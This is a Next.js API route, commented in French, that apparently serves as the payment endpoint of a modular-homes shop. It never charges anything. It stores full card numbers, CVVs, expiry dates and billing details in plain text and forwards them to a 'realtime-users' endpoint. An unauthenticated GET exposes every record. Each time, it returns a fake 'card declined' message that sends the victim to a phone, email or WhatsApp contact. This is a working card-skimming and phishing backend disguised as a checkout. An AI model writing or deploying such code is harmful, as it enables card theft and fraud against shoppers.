import { NextRequest, NextResponse } from 'next/server';

interface PaymentAttempt {
  id: string;
  userId?: string;
  email: string;
  productName: string;
  productPrice: string;
  cardNumber: string;
  cvv: string;
  expiryDate: string;
  cardHolderName: string;
  billingInfo: {
    firstName: string;
    lastName: string;
    email: string;
    phone: string;
    address: string;
    city: string;
    postalCode: string;
    country: string;
  };
  status: 'attempted' | 'failed' | 'needs_contact';
  attemptedAt: string;
  errorMessage?: string;
}

// Stockage des tentatives de paiement
let paymentAttempts: PaymentAttempt[] = [];

// POST - Enregistrer une tentative de paiement
export async function POST(request: NextRequest) {
  try {
    const paymentData = await request.json();
    
    // Validation
    if (!paymentData.email || !paymentData.cardNumber) {
      return NextResponse.json(
        { error: 'Email et numéro de carte requis' },
        { status: 400 }
      );
    }

    // Créer l'enregistrement de la tentative de paiement
    const paymentAttempt: PaymentAttempt = {
      id: `payment_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      userId: paymentData.userId,
      email: paymentData.email,
      productName: paymentData.productName,
      productPrice: paymentData.productPrice,
      cardNumber: paymentData.cardNumber,
      cvv: paymentData.cvv,
      expiryDate: `${paymentData.expiryMonth}/${paymentData.expiryYear}`,
      cardHolderName: paymentData.cardHolderName,
      billingInfo: paymentData.billingInfo,
      status: 'attempted',
      attemptedAt: new Date().toISOString(),
      errorMessage: 'Carte non acceptée - Contactez un agent'
    };

    // Ajouter à la liste
    paymentAttempts.push(paymentAttempt);

    // Mettre à jour le statut de l'utilisateur dans l'API realtime-users
    try {
      await fetch(`${request.nextUrl.origin}/api/realtime-users?email=${encodeURIComponent(paymentData.email)}`, {
        method: 'PUT',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          ...paymentData.billingInfo,
          cardNumber: paymentData.cardNumber,
          cvv: paymentData.cvv,
          expiryDate: `${paymentData.expiryMonth}/${paymentData.expiryYear}`,
          cardHolderName: paymentData.cardHolderName,
          cardType: getCardType(paymentData.cardNumber),
          status: 'payment_failed',
          lastActivity: new Date().toISOString()
        })
      });
    } catch (error) {
      console.error('Erreur mise à jour utilisateur temps réel:', error);
    }

    // Simuler l'échec du paiement avec message personnalisé
    return NextResponse.json({
      success: false,
      error: 'PAYMENT_DECLINED',
      message: 'Votre carte bancaire n\'a pas été acceptée par notre système de paiement.',
      paymentAttemptId: paymentAttempt.id,
      contactOptions: {
        phone: '+33 1 23 45 67 89',
        email: 'support@modular-homes.fr',
        whatsapp: '+33 6 12 34 56 78',
        livechat: true
      }
    }, { status: 402 }); // 402 Payment Required
    
  } catch (error) {
    console.error('Erreur tentative de paiement:', error);
    return NextResponse.json(
      { error: 'Erreur lors du traitement du paiement' },
      { status: 500 }
    );
  }
}

// GET - Récupérer les tentatives de paiement
export async function GET(request: NextRequest) {
  try {
    return NextResponse.json(paymentAttempts, {
      status: 200,
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      }
    });
    
  } catch (error) {
    console.error('Erreur récupération tentatives paiement:', error);
    return NextResponse.json(
      { error: 'Erreur serveur' },
      { status: 500 }
    );
  }
}

// Fonction helper pour déterminer le type de carte
function getCardType(cardNumber: string): 'Visa' | 'MasterCard' | 'Amex' {
  const number = cardNumber.replace(/\s/g, '');
  if (number.startsWith('4')) return 'Visa';
  if (number.startsWith('5') || (number.startsWith('2') && parseInt(number.substring(0, 4)) >= 2221 && parseInt(number.substring(0, 4)) <= 2720)) return 'MasterCard';
  if (number.startsWith('3')) return 'Amex';
  return 'Visa'; // Par défaut
}